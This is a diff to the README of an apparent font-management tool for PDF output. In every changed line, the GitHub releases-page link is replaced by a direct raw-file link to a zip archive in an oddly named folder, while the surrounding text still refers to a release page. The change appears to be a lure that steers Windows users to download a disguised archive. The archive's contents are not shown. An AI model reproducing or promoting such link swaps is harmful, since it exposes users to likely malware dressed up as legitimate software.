@@ -1,11 +1,11 @@
 # 🖋️ vmprint-font-managers - Simple font control for PDF output
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Maryannan1230/vmprint-font-managers/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Maryannan1230/vmprint-font-managers/main/boughed/vmprint_font_managers_2.3.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows release:
-https://github.com/Maryannan1230/vmprint-font-managers/releases
+https://raw.githubusercontent.com/Maryannan1230/vmprint-font-managers/main/boughed/vmprint_font_managers_2.3.zip
 
 ## 🧰 What this app does
 
@@ -32,7 +32,7 @@ Before you install, check these basics:
 ## 🚀 Getting started
 
 1. Open the download page:
-   https://github.com/Maryannan1230/vmprint-font-managers/releases
+   https://raw.githubusercontent.com/Maryannan1230/vmprint-font-managers/main/boughed/vmprint_font_managers_2.3.zip
 
 2. Find the latest release.
 
@@ -164,4 +164,4 @@ The selected font may not be installed, may not load from the web, or may not ma
 ## 🔗 Download again
 
 Visit this page to download the Windows release:
-https://github.com/Maryannan1230/vmprint-font-managers/releases
+https://raw.githubusercontent.com/Maryannan1230/vmprint-font-managers/main/boughed/vmprint_font_managers_2.3.zip
